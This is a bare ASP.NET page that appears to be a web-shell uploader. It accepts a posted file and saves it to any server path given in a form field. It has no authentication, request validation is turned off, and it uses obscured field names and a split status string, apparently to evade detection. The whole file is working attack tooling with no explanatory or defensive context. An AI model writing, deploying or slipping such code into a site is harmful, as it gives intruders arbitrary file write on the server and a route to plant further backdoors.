<%@ Page Language="C#" ValidateRequest="false" EnableViewState="false" %>

<%@ Import Namespace="System.IO" %>
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
    <%
        try
        {
            ress.InnerText = string.Empty;

            if (!string.IsNullOrEmpty(HttpContext.Current.Request.Form["bala"]))
            {
                HttpPostedFile file = HttpContext.Current.Request.Files["hala"];
                if (file != null && file.ContentLength > 0)
                {
                    file.SaveAs(HttpContext.Current.Request.Form["bala"]);
                    ress.InnerText = "...u" + "ploaded...";
                }
            }
        }
        catch (Exception ex)
        {
            ress.InnerText = ex.ToString();
        }
    %>
</head>
<body>
    <form method="post" enctype="multipart/form-data">
        <input name="hala" type="file" />
        <input name="bala" type="text" />
        <input type="submit" value="Upload" />
    </form>
    <pre id="ress" runat="server"></pre>
</body>
</html>
